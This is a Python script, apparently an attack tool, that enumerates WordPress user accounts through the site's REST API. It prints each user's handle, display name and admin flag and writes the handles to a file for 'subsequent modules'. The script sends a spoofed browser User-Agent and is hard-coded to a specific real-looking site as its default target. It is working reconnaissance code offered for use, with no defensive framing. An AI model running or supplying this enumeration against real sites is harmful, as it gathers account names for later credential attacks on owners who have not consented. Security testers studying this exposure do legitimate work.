import asyncio
import httpx
import sys

async def extract_users(target_url):
    url = target_url.rstrip("/") + "/wp-json/wp/v2/users"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
    }
    
    print(f"[*] Querying user enumeration endpoint: {url}")
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(url, headers=headers, timeout=10.0, follow_redirects=True)
            if response.status_code == 200:
                users = response.json()
                print(f"\n[+] Successfully extracted {len(users)} user profile(s):")
                
                usernames = []
                for user in users:
                    slug = user.get("slug")
                    name = user.get("name")
                    is_admin = user.get("is_super_admin", False)
                    usernames.append(slug)
                    print(f"    └── [Admin: {is_admin}] Handle: {slug} (Name: {name})")
                
                # Save handles to a text file for subsequent modules
                output_file = "discovered_usernames.txt"
                with open(output_file, "w", encoding="utf-8") as f:
                    for uname in usernames:
                        f.write(f"{uname}\n")
                print(f"\n[+] Exported {len(usernames)} handles to {output_file}")
                
            else:
                print(f"[-] Failed to fetch users. Status: HTTP {response.status_code}")
        except Exception as e:
            print(f"[-] Error parsing user endpoint: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://medistore.se"
    asyncio.run(extract_users(target))
